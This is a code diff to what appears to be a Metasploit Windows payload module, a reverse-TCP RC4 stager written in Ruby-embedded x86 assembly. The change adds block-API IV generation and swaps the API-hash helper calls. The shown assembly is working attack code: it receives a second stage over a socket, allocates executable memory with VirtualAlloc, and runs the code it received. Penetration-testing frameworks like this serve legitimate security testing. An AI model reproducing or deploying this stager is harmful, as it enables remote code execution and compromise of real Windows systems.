@@ -41,6 +41,7 @@ module Payload::Windows::ReverseTcpRc4
   # Generate and compile the stager
   #
   def generate_reverse_tcp_rc4(opts={})
+    block_api_iv # ensure the block API IV is generated before we generate the shellcode so that the hashes are correct
     combined_asm = %Q^
       cld                    ; Clear the direction flag.
       call start             ; Call start, this pushes the address of 'api_call' onto the stack.
@@ -70,7 +71,7 @@ module Payload::Windows::ReverseTcpRc4
         push 4                  ; length = sizeof( DWORD );
         push esi                ; the 4 byte buffer on the stack to hold the second stage length
         push edi                ; the saved socket
-        push #{Rex::Text.block_api_hash('ws2_32.dll', 'recv')}
+        push #{block_api_hash('ws2_32.dll', 'recv')}
         call ebp                ; recv( s, &dwLength, 4, 0 );
     ^
 
@@ -93,7 +94,7 @@ module Payload::Windows::ReverseTcpRc4
       ; push esi               ; push the newly received second stage length.
           push ecx             ; push the alloc length
         push 0                 ; NULL as we dont care where the allocation is.
-        push #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualAlloc')}
+        push #{block_api_hash('kernel32.dll', 'VirtualAlloc')}
         call ebp               ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
       ; Receive the second stage and execute it...
       ; xchg ebx, eax          ; ebx = our new memory address for the new stage + S-box
@@ -106,7 +107,7 @@ module Payload::Windows::ReverseTcpRc4
         push esi               ; length
         push ebx               ; the current address into our second stage's RWX buffer
         push edi               ; the saved socket
-        push #{Rex::Text.block_api_hash('ws2_32.dll', 'recv')}
+        push #{block_api_hash('ws2_32.dll', 'recv')}
         call ebp               ; recv( s, buffer, length, 0 );
     ^
 
@@ -122,13 +123,13 @@ module Payload::Windows::ReverseTcpRc4
         push 0x4000             ; dwFreeType (MEM_DECOMMIT)
         push 0                  ; dwSize
         push eax                ; lpAddress
-        push #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualFree')}
+        push #{block_api_hash('kernel32.dll', 'VirtualFree')}
         call ebp                ; VirtualFree(payload, 0, MEM_DECOMMIT)
 
       cleanup_socket:
         ; clear up the socket
         push edi                ; socket handle
-        push #{Rex::Text.block_api_hash('ws2_32.dll', 'closesocket')}
+        push #{block_api_hash('ws2_32.dll', 'closesocket')}
         call ebp                ; closesocket(socket)
 
         ; restore the stack back to the connection retry count
